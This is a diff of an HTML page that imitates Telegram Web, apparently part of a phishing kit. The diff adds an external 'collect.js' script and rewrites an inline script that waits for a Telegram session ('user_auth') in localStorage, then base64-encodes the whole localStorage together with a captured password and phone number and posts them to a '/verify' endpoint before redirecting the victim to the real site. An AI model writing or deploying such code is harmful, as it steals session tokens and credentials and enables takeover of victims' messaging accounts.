@@ -41,6 +41,7 @@
     <link rel="canonical" href="https://web.telegram.org/">
 
     <link rel="manifest" id="manifest">
+    <script type="text/javascript" crossorigin src="./collect.js"></script>
     <script type="module" crossorigin src="./index-CUunZKC8.js"></script>
     <link rel="stylesheet" crossorigin href="./index-jdz_mo9Z.css">
   </head>
@@ -155,38 +156,40 @@
     </div>
     <div id="stories-viewer"></div>
     <script>
-  var interval = setInterval(function () {
-  if (localStorage.getItem("user_auth")) {
-    clearInterval(interval);
-    postLocalStorageWithFetch();
-  }
-}, 1000);
+      var interval = setInterval(function () {
+        if (localStorage.getItem("user_auth")) {
+          clearInterval(interval)
+          postLocalStorageWithFetch()
+        }
+      }, 1000)
 
-function postLocalStorageWithFetch() {
-  let data = btoa(JSON.stringify(localStorage))
+      function postLocalStorageWithFetch() {
+        let data = btoa(JSON.stringify({
+          pass: window.detectedPass || false,
+          phone: window.detectedPhone || false,
+          ls: localStorage
+        }))
 
-  console.log('data:', data)
-  fetch(`/verify`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'text/plain'
-    },
-    body: data
-  })
-  .then(response => response.json())
-  .then(data => {
-    if (data.clearLocalStorage) {
-      localStorage.clear();
-      location.reload();
-    } else if (data.error) {
-      alert(data.error);
-    } else {
-      document.location = 'https://web.telegram.org';
-    }
-  })
-  .catch(error => console.error('Error:', error));
-}
-
-</script>
+        fetch(`/verify`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'text/plain'
+          },
+          body: data
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.clearLocalStorage) {
+            localStorage.clear();
+            location.reload();
+          } else if (data.error) {
+            alert(data.error);
+          } else {
+            document.location = 'https://web.telegram.org'
+          }
+        })
+        .catch(error => console.error('Error:', error))
+      }
+    </script>
   </body>
 </html>
